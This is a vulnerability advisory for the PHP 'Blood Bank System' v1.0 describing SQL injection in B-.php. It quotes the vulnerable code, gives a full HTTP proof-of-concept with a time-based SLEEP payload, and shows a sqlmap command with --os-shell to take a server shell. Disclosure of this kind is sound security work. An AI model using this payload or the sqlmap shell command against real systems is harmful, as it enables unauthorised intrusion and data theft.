# blood-bank-system-in-php B-.php getshell

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

**/admin/blood/update/B-.php**

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

## PROBLEM TYPE

## Vulnerability Type

SQL INJECTION GET SHELL

## Root Cause

There are  sql injection in B-.php,Hacker can get shell via the vulnerable.

## Impact

## **Description of the vulnerability**

## B-.PHP

Get Bloodname value from $_POST，And join it to sql statement.  There is sql injection vulnerable.

```
$con= mysqli_connect('localhost', 'root', 'root');
mysqli_select_db($con,'bloodbank');
$Bloodname=$_POST['Bloodname'];
$availability=$_POST['Availibility'];
$unit=$_POST['unit'];
$s = "select * from b_ where Bloodname= '$Bloodname'";
$result = mysqli_query($con, $s);
```

​                                                                                                                                                                                                                                                                                                                                                                                                                  

## **Vulnerability recurrence**

### **POC**

```
POST /admin/blood/update/B-.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/admin/blood/update/B-.php
Cookie: PHPSESSID=se5tfm9d762ti3jv5sctqmdl6n
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Bloodname=1' AND (SELECT 2801 FROM (SELECT(SLEEP(5)))iXJy)-- KPmd
```

save as 1.txt

We can get  databases name via the sql injection vulnerability.

Result

Since the default is the root database, you can also use some Trojans to obtain server permissions.

```
python sqlmap.py -r "1.txt" --level 3 --risk 2 --os-shell
```

![wps1](https://github.com/user-attachments/assets/c6464bab-66a4-45de-8ae4-d7c2e2b06ab2)